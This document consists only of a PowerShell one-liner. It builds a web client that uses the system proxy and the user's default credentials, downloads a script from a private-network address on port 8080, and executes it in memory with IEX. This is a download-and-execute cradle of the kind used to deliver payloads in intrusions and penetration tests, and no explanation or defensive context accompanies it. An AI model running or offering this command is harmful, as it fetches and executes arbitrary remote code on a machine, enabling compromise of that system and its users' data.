
$m=new-object net.webclient;$m.proxy=[Net.WebRequest]::GetSystemWebProxy();$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $m.downloadstring('http://192.168.1.139:8080/lol');

